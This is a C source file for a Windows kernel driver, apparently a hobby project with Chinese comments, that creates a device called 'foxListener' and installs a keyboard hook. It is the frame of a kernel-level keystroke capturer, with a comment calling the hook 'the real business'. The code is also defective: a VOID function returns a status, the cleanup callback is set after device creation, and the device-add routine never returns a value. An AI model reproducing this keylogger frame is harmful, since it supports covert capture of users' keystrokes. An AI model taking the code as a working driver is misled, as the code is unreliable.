#include <ntddk.h>
#include <wdf.h>
#include "tool.h"
#include <initguid.h>


// {507D37D2-5F80-4093-A6E3-8F86613ED4F5}
DEFINE_GUID(DEVICEINTERFACE,0x507d37d2, 0x5f80, 0x4093, 0xa6, 0xe3, 0x8f, 0x86, 0x61, 0x3e, 0xd4, 0xf5);


//清理函数
VOID EvtDeviceContextCleanup(_In_ WDFOBJECT Object)
{

    // 卸载所有钩子，释放资源
    uninstallKeyboardHook();
    //uninstallMouseHook();
    FreeSystemModuleTable();

    DbgPrint("驱动已成功卸载\n");
    return STATUS_SUCCESS;
}


NTSTATUS EvtDriverDeviceAdd(
    _In_    WDFDRIVER       Driver,
    _Inout_ PWDFDEVICE_INIT DeviceInit
)
{
    NTSTATUS status;
    WDFDEVICE device;
    WDF_OBJECT_ATTRIBUTES deviceAttributes;

    //初始化设备属性（需要初始化后才可以创建设备，WDF_OBJECT_ATTRIBUTES_INIT_CONTEXT_TYPE是先初始化后关联设备上下文）
    WDF_OBJECT_ATTRIBUTES_INIT(&deviceAttributes);



    //创建一个wdf设备
    status = WdfDeviceCreate(&DeviceInit, &deviceAttributes, &device);
    if (!NT_SUCCESS(status))
    {
        KdPrint(("wdf设备创建设备失败 : 0x%08x\n", status));
        return status;
    }
    //指定清理函数
    deviceAttributes.EvtCleanupCallback = EvtDeviceContextCleanup;
    //创建设备接口
    WdfDeviceCreateDeviceInterface(device, &DEVICEINTERFACE, NULL);
    //创建符号链接
    UNICODE_STRING DEVICE_NAME;
    UNICODE_STRING DOS_DEVICE_NAME;
    RtlInitUnicodeString(&DEVICE_NAME, L"\\Device\\foxListener");
    RtlInitUnicodeString(&DOS_DEVICE_NAME, L"\\DosDevices\\foxListener");
    status = WdfDeviceCreateSymbolicLink(device, &DOS_DEVICE_NAME);







    //基本的东西搞定后该办正事了
    // 初始化系统模块表
    status = InitializeSystemModuleTable();
    if (!NT_SUCCESS(status))
    {
        DbgPrint("初始化系统模块表失败 (0x%X)\n", status);
        return status;
    }


    // 安装键盘钩子
    status = installKeyboardHook();
    if (!NT_SUCCESS(status))
    {
        DbgPrint("安装键盘钩子失败 (0x%X)\n", status);
        return status;
    }

    //// 安装鼠标钩子
    //status = installMouseHook();
    //if (!NT_SUCCESS(status))
    //{
    //    DbgPrint("安装鼠标钩子失败 (0x%X)\n", status);
    //    uninstallKeyboardHook();
    //    return status;
    //}
}